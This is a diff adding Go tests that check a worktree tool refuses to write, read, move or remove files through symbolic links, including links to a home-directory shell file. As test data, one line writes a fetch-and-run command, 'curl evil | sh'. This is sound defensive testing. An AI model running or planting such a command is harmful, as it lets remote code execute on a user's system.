@@ -101,3 +101,103 @@ func TestStateRoundTrip(t *testing.T) {
 		t.Fatalf("empty state = %+v, %v", empty, err)
 	}
 }
+
+// PAIN-91: a symbolic link a checkout brought into .ghosttree/edit/ is not
+// followed, for writing, reading, moving or removing, and neither is a linked
+// directory or state file.
+func TestTheDocumentWorktreeDoesNotFollowSymbolicLinks(t *testing.T) {
+	home := t.TempDir()
+	repo := t.TempDir()
+	outside := filepath.Join(home, ".bash_aliases")
+	if err := os.MkdirAll(filepath.Join(Dir(repo), "specs"), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	// A dangling link: the file it names does not exist yet.
+	if err := os.Symlink(outside, filepath.Join(Dir(repo), "specs", "2026-01-01-x.md")); err != nil {
+		t.Fatal(err)
+	}
+	if err := WriteFile(repo, "specs/2026-01-01-x.md", "curl evil | sh\n"); err == nil {
+		t.Fatal("wrote through a link")
+	}
+	if _, err := os.Stat(outside); !os.IsNotExist(err) {
+		t.Fatalf("a file outside the worktree was made: %v", err)
+	}
+	if _, err := ReadFile(repo, "specs/2026-01-01-x.md"); err == nil || os.IsNotExist(err) {
+		t.Fatalf("read of a dangling link: %v (it has to be refused, not missing)", err)
+	}
+	// A link to an existing file is not read, moved or removed through.
+	if err := os.WriteFile(outside, []byte("secret"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if got, err := ReadFile(repo, "specs/2026-01-01-x.md"); err == nil {
+		t.Fatalf("read through a link: %q", got)
+	}
+	if err := MoveFile(repo, "specs/2026-01-01-x.md", "specs/2026-01-01-y.md"); err == nil {
+		t.Fatal("moved a link")
+	}
+	// A linked state file is neither read nor written over.
+	if err := os.Symlink(outside, filepath.Join(Dir(repo), ".state.json")); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := LoadState(repo); err == nil {
+		t.Fatal("read a linked state file")
+	}
+	if err := SaveState(repo, State{"x": {}}); err == nil {
+		t.Fatal("wrote over a linked state file")
+	}
+	if b, _ := os.ReadFile(outside); string(b) != "secret" {
+		t.Fatalf("the file outside changed: %q", b)
+	}
+	// A linked kind directory, a linked edit directory and a linked
+	// .ghosttree directory are refused.
+	for name, link := range map[string]func(root string) string{
+		"kind":  func(root string) string { return filepath.Join(Dir(root), "plans") },
+		"edit":  func(root string) string { return Dir(root) },
+		"ghost": func(root string) string { return filepath.Join(root, ".ghosttree") },
+	} {
+		root := t.TempDir()
+		target := t.TempDir()
+		path := link(root)
+		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.Symlink(target, path); err != nil {
+			t.Fatal(err)
+		}
+		if err := WriteFile(root, "plans/2026-01-01-z.md", "x"); err == nil {
+			t.Fatalf("%s: wrote into a linked directory", name)
+		}
+		if err := SaveState(root, State{"z": {}}); name != "kind" && err == nil {
+			t.Fatalf("%s: wrote the state into a linked directory", name)
+		}
+		entries, _ := os.ReadDir(target)
+		for _, e := range entries {
+			t.Fatalf("%s: %s appeared in the linked directory", name, e.Name())
+		}
+	}
+}
+
+func TestTheDocumentWorktreeStillWorksWithPlainFiles(t *testing.T) {
+	repo := t.TempDir()
+	if err := WriteFile(repo, "plans/2026-01-01-a.md", "one"); err != nil {
+		t.Fatal(err)
+	}
+	if err := WriteFile(repo, "plans/2026-01-01-a.md", "two"); err != nil {
+		t.Fatal(err)
+	}
+	if got, err := ReadFile(repo, "plans/2026-01-01-a.md"); err != nil || got != "two" {
+		t.Fatalf("ReadFile = %q, %v", got, err)
+	}
+	if err := MoveFile(repo, "plans/2026-01-01-a.md", "specs/2026-01-01-a.md"); err != nil {
+		t.Fatal(err)
+	}
+	if err := SaveState(repo, State{"a": {Path: "specs/2026-01-01-a.md"}}); err != nil {
+		t.Fatal(err)
+	}
+	if st, err := LoadState(repo); err != nil || st["a"].Path != "specs/2026-01-01-a.md" {
+		t.Fatalf("LoadState = %v, %v", st, err)
+	}
+	if err := RemoveFile(repo, "specs/2026-01-01-a.md"); err != nil {
+		t.Fatal(err)
+	}
+}
